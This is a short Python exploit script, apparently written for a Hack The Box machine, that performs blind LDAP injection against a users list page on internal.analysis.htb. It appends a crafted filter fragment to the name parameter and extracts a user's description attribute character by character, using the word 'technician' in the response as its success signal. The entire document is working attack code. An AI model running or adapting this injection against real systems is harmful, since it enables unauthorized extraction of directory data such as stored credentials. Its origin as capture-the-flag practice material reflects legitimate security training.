#!/usr/bin/python3
import requests
import string
from time import sleep
import sys

attribute = 'description'

url = f"http://internal.analysis.htb/users/list.php?name="
alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:; "


value = ""
finish = False
while not finish:
    for char in alphabet: #In each possition test each possible printable char
        query = url+f"*)({attribute}={value}{char}*"
        r = requests.post(query)
        sys.stdout.write(f"\r{attribute}: {value}{char}")
        #sleep(0.5) #Avoid brute-force bans
        if "technician" in r.text:
            value += str(char)
            break

        if char == alphabet[-1]: #If last of all the chars, then, no more chars in the value
            finish = True
            print()
